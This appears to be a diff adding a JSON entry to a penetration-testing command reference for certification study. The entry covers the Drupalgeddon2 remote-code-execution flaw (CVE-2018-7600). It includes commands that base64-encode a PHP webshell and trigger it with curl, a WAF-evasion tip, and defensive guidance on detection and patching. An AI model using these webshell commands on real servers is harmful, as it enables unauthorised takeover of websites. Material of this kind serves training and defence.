@@ -1,0 +1,96 @@
+{
+  "type": "command",
+  "platform": "linux",
+  "requires": [
+    "network-access"
+  ],
+  "protocols": [
+    "http"
+  ],
+  "tools": [
+    "python"
+  ],
+  "tags": [
+    "drupal",
+    "cve",
+    "rce"
+  ],
+  "category": "Exploitation",
+  "subcategory": "Drupal",
+  "certifications": [
+    "CPTS",
+    "CWES",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 24: Attacking Common Applications",
+  "examples": [
+    {
+      "label": "Base64-encode the PHP webshell for the payload",
+      "command": "echo '<?php system($_GET[<rand>]);?>' | base64"
+    },
+    {
+      "label": "Trigger the dropped webshell",
+      "command": "curl http://drupal-dev.inlanefreight.local/mrb3n.php?<rand>=id"
+    }
+  ],
+  "notes": "Unauthenticated RCE (CVE-2018-7600) covering Drupal 7 and 8 - the highest-value option when the version matches. The base64 step just smuggles the PHP shell past request parsing.",
+  "references": [
+    {
+      "title": "SA-CORE-2018-002 (Drupalgeddon2)",
+      "url": "https://www.drupal.org/sa-core-2018-002"
+    },
+    {
+      "title": "HTB Academy - Attacking Common Applications",
+      "url": "https://academy.hackthebox.com/module/details/113"
+    },
+    {
+      "title": "OffSec PEN-200 - Web Application Attacks",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "drupal-detect",
+      "note": "Confirms the vulnerable version.",
+      "rel": "prereq"
+    },
+    {
+      "id": "drupalgeddon",
+      "note": "Older CVE-2014-3704 path.",
+      "rel": "alternative"
+    },
+    {
+      "id": "drupalgeddon3-msf",
+      "note": "Authenticated Metasploit variant.",
+      "rel": "alternative"
+    }
+  ],
+  "id": "drupalgeddon2",
+  "name": "Drupalgeddon2 - RCE (CVE-2018-7600)",
+  "command": "python3 drupalgeddon2.py",
+  "description": "Exploits CVE-2018-7600 (Drupal 7/8) for unauthenticated RCE, typically dropping a base64-decoded PHP webshell that is then invoked with a command parameter.",
+  "opsec": "loud",
+  "mitre": [
+    "T1190",
+    "T1505.003"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "Drupalgeddon2 (CVE-2018-7600) exploits the Drupal Form API. User-supplied '#' prefixed form properties are processed by AJAX callbacks without sanitization, injecting arbitrary PHP callbacks that execute system commands. No authentication required.",
+    "prerequisites": "Drupal 7.x < 7.58 or 8.x < 8.3.9/8.4.6/8.5.1. Unauthenticated -- the vulnerable endpoint is accessible without login.",
+    "impact": "Unauthenticated RCE as www-data. Webshell placement. Full server compromise from a single HTTP request.",
+    "detection": "POST request to /user/register or Drupal forms with '#' prefixed parameters. IDS signature for CVE-2018-7600 payload pattern.",
+    "artifacts": "Web server access log (POST to /user/register with exploit payload) | IDS alert for Drupalgeddon2 signature | New .php file created by web server process",
+    "prevention": "Update to Drupal 7.58 / 8.5.1 or later immediately. Enable automated security update notifications. Apply WAF rules with CVE-2018-7600 signatures.",
+    "misconfiguration": "Unpatched Drupal 7.x or 8.x accessible from the internet without WAF protection.",
+    "vulnerable_config": "# Drupal 7.x < 7.58 or 8.x < 8.5.1\n# Vulnerable form element handling in form.inc\n# '#post_render', '#type' callbacks not sanitized",
+    "secure_config": "# Patch to current Drupal release\ndrush pm-update\n# WAF rule: block '#' prefixed parameter names in POST bodies",
+    "evasion": "URL-encode payload to bypass simple WAF string matching. Use multipart form encoding.",
+    "sources": [
+      "HTB M24",
+      "MITRE T1190",
+      "OWASP A06:2021"
+    ]
+  }
+}
